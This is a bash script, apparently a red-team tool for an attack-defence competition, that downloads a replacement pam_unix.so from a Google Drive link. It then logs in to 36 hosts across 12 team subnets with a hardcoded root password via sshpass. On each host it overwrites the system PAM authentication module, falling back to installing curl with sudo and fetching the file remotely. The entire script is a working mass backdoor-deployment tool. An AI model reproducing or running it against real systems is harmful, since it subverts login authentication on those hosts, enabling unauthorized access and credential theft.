#!/bin/bash

username="root"
password="Password1!"
network_id="1.1"
host_ids=(1 2 3)

timeout=5
max_jobs=10
path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
path_to_tmp_pam="/tmp/pam_unix.so"
link_to_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"

main() {
    curl -o "$path_to_tmp_pam" "$link_to_pam"

    local IPs=()
    for ((team=1; team<=12; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done

    local job_count=0
    for IP in "${IPs[@]}"; do
        {
            sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_tmp_pam" "$username@$IP:$path_to_pam" && \
            echo "SUCCESS  (SCP): $IP" || \
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
                echo \"$password\" | sudo -S apt install -y curl || \
                echo \"$password\" | sudo -S yum install -y curl || \
                echo \"$password\" | sudo -S zypper install -y curl || \
                echo \"$password\" | sudo -S pacman -Syu curl --noconfirm;
                echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\"; \
                echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
            " && \
            echo "SUCCESS (CURL): $IP" || \
            echo -e "!!!!!!!!!!!!!!!!!!!!!\nFAIL: $IP\n!!!!!!!!!!!!!!!!!!!!!"
        } & 
        ((job_count++))
        if ((job_count >= max_jobs)); then
            wait -n
            ((job_count--))
        fi
    done
    wait
}

main
